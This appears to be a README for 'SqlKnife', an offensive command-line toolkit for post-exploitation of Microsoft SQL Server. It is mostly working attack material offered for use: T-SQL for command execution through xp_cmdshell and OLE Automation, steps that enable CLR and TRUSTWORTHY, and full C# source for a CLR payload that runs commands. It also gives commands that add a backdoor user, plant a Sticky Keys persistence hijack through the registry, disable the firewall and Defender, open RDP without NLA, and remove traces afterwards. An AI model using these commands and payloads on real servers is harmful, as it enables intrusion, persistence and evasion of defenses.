# MSSQL Commandline Post-Exploitation Toolkit

**MSSQL-Based System Management**

A fully featured command line tool for post-exploitation operations on Microsoft SQL Server instances. Provides RCE (Remote Code Execution), privilege escalation, persistence, evasion, and cleanup capabilities via T-SQL injection or authenticated access.

> Designed for red team members, pentesters, and offensive security researchers who want to move from SQL injection to the SYSTEM shell with a single command.


## Features

- **Remote Code Execution** via multiple vectors:
  - `xp_cmdshell`
  - `sp_OACreate` (OLE Automation)
  - **Custom CLR Assemblies** (`SqlCmdExec`, `DownLoadExec`, `PotatoInSQL`, `EfsPotatoCmd`)
- **Privilege Escalation & Environment Prep**:
  - Enable advanced procedures
  - Enable CLR integration
  - Set `TRUSTWORTHY ON`
- **Defense Evasion**:
  - Disable Windows Firewall (Domain/Public/Private profiles)
  - Disable Windows Defender via registry
- **Persistence**:
  - Sticky Keys hijack (`sethc.exe` → `cmd.exe`)
- **Lateral Movement Prep**:
  - Enable RDP and disable Network Level Authentication (NLA)
- **Cleanup & Reversal**:
  - Drop malicious procedures/assemblies
  - Disable CLR/xp_cmdshell post-operation
- **Supports .NET 3.5 and .NET 4.x CLR payloads**
- **Full CLI interface with long/short options**

## Quick Start

```bash
# Basic RCE via xp_cmdshell
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' -c "whoami" --xpcmd

# Enable RDP + Sticky Keys backdoor
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' --openrdp --shift

# Deploy CLR-based command executor (.NET 4)
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' --clrcmd --4 --fix
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' -c "net user hack P@ss123 /add" --clrcmd

# Remove all traces
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' --clrcmd --remove
```

## Download Installation

**It is a standalone C++ executable file** (it only works on Windows due to Windows-specific T-SQL loads).

### Compiling
- Prerequisites
    - Visual Studio 2022
    - Windows SDK
    - Desktop development with C++

      <img width="500" height="244" alt="screen" src="https://github.com/user-attachments/assets/f3a2def7-4578-4218-9aab-6e6e09693c14" />
    
    - Data storage and processing
  
      <img width="500" height="295" alt="screen" src="https://github.com/user-attachments/assets/5b715d84-1fe3-45dc-9f86-21e29fa8b640" />

- Download the project to your computer.
- Extract the Project to a Folder.
- Open the solution file (.sln).
- Select **Build Solution** from the **Build** menu.

> **Note**: The tool relies on the Windows registry and ODBC, so it only works on Windows hosts (attacker or proxy).



## Attack Vectors Explained

### 1. **RCE via T-SQL (Classic)**
```sql
-- xp_cmdshell (if enabled)
EXEC xp_cmdshell ‘whoami’;

-- OLE Automation (if enabled)
DECLARE @shell INT;
EXEC sp_oacreate ‘wscript.shell’, @shell OUT;
EXEC sp_oamethod @shell, ‘run’, null, ‘cmd /c whoami’;
```

### 2. **Privilege Escalation Chain**
To use advanced features, you often need to **enable backend components**:
```sql
-- Step 1: Enable advanced options
EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE;

-- Step 2: Enable xp_cmdshell or OLE
EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;
-- OR
EXEC sp_configure ‘Ole Automation Procedures’, 1; RECONFIGURE;

-- Step 3: For CLR attacks
EXEC sp_configure ‘clr enabled’, 1; RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;
```

> **Automates this chain** with `--fix`.


### 3. **DBUP / DBUP2 Exploit Chain (Advanced CLR Attacks)**

**DBUP** and **DBUP2** refer to custom CLR assemblies (`PotatoInSQL` and `EfsPotatoCmd`) that leverage:
- **Named pipe impersonation** (like `JuicyPotato`)
- **EFSRPC abuse** (like `EfsPotato`)
- **.NET unsafe code execution**

#### Full Exploit Flow:
1. Enable CLR & TRUSTWORTHY
2. Upload base64-encoded or hex-encoded malicious DLL via `CREATE ASSEMBLY`
3. Bind to T-SQL stored procedure
4. Execute with high privileges (often **NT AUTHORITY\SYSTEM**)

> These bypass common AMSI/EDR because execution happens **inside SQL Server process**.


### 4. **Malicious CLR Payload (Example Snippet)**

Inside your compiled `.dll` (C#):
```csharp
using Microsoft.SqlServer.Server;
using System;
using System.Data;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void SqlCmdExec(String cmd)
    {
        //public static void SqlCmdExec(string filename, string cmd)
        {
            //if (!string.IsNullOrEmpty(cmd)&&!string.IsNullOrEmpty(filename))
            if (!string.IsNullOrEmpty(cmd))
            {
                //SqlContext.Pipe.Send(RunCommand("cmd.exe", "/c " + cmd));
                //RunCommand("cmd.exe","/c "+cmd);

                string cmdres = RunCommand("sqlps.exe", cmd);
                SqlDataRecord rec = new SqlDataRecord(new SqlMetaData[] {
                new SqlMetaData("output",SqlDbType.Text,-1)
            });
                SqlContext.Pipe.SendResultsStart(rec);
                rec.SetSqlString(0, cmdres);
                SqlContext.Pipe.SendResultsRow(rec);
                SqlContext.Pipe.SendResultsEnd();


            }
        }
    }

    public static string RunCommand(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            //SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }

}
```

Compiled with:
```bash
csc /target:library /unsafe SqlCmdExec.cs
```

Then converted to hex/base64 for injection via `CREATE ASSEMBLY`.

> SqlKnife handles the T-SQL wrapper—**you just provide the payload** (in future versions, embedded).


### 5. **Sticky Keys Persistence**

Hijack `sethc.exe` (Shift key) to spawn `cmd.exe` at login screen:

```sql
EXEC xp_regwrite 
  'HKEY_LOCAL_MACHINE',
  'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
  'debugger',
  'REG_SZ',
  'c:\windows\system32\cmd.exe';
```

> **Physical or RDP access required**, but **no authentication needed** once triggered.


### 6. **MSSQL → OS Shell (Working PoCs)**

| Vector | Command | Works When... |
|-------|--------|---------------|
| `xp_cmdshell` | `EXEC xp_cmdshell 'ipconfig'` | Enabled & sysadmin |
| `sp_OACreate` | `sp_oacreate 'wscript.shell',...` | OLE enabled |
| CLR Assembly | `EXEC SqlCmdExec 'net user'` | CLR enabled + TRUSTWORTHY |
| `xp_regwrite` | Disable firewall/enable RDP | Registry write access |


## Bypass Techniques

- **Firewall Bypass**: Disable all firewall profiles via registry
- **Defender Disable**: Set `DisableAntiSpyware=1` in `HKLM\...\Windows Defender`
- **AV Evasion**: CLR code runs in `sqlservr.exe`—often not monitored
- **No File Drop**: All payloads executed in-memory or via SQL injection



## Usage Guide

```text
SqlKnife v1.0
A mssql exploit tool in commandline.

SqlKnife.exe <-H host> <-P port> <-u username> <-p password> <-D dbname> <-c cmd>
               <--openrdp> <--shift> <--disfw>
               <--xpcmd> <--oacreate> <--clrcmd> <--clrdexec> <--dbup> <--dbup2>
               <--fix> <--remove> <--3/--4>
```

### Options

| Short | Long | Description |
|------|------|------------|
| `-H` | — | SQL Server IP (default: `127.0.0.1`) |
| `-P` | — | Port (default: `1433`) |
| `-u` | — | Username (default: `sa`) |
| `-p` | — | Password |
| `-D` | — | Database (default: `master`) |
| `-c` | — | Command to execute |
| — | `--openrdp` | Enable RDP (port 3389) |
| — | `--shift` | Install Sticky Keys backdoor |
| — | `--disfw` | Disable Windows Firewall + Defender |
| — | `--xpcmd` | Use `xp_cmdshell` for RCE |
| — | `--oacreate` | Use OLE Automation (`sp_OACreate`) |
| — | `--clrcmd` | Use `SqlCmdExec` CLR procedure |
| — | `--clrdexec` | Use `DownLoadExec` (download & exec) |
| — | `--dbup` | Deploy `PotatoInSQL` (JuicyPotato-like) |
| — | `--dbup2` | Deploy `EfsPotatoCmd` (EfsPotato) |
| — | `--fix` | Enable required SQL features for selected method |
| — | `--remove` | Clean up procedures/assemblies |
| — | `--3` / `--4` | Target .NET 3.5 or .NET 4.x CLR |

## Cleanup

Always remove traces after exploitation:

```bash
# Remove CLR-based backdoor
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' --clrcmd --remove

# Disable xp_cmdshell
SqlKnife -H 192.168.1.10 -u sa -p 'P@ssw0rd!' --xpcmd --remove
```

> **Never leave CLR assemblies or procedures behind**—they are noisy and persistent.

## Disclaimer

This tool is for **authorized penetration testing and educational purposes only**.  
The author **disclaims all liability** for misuse. Use responsibly and **only on systems you own or have explicit permission to test**.

## License

This project is licensed under the MIT License. For more information, see the [LICENSE file](LICENSE).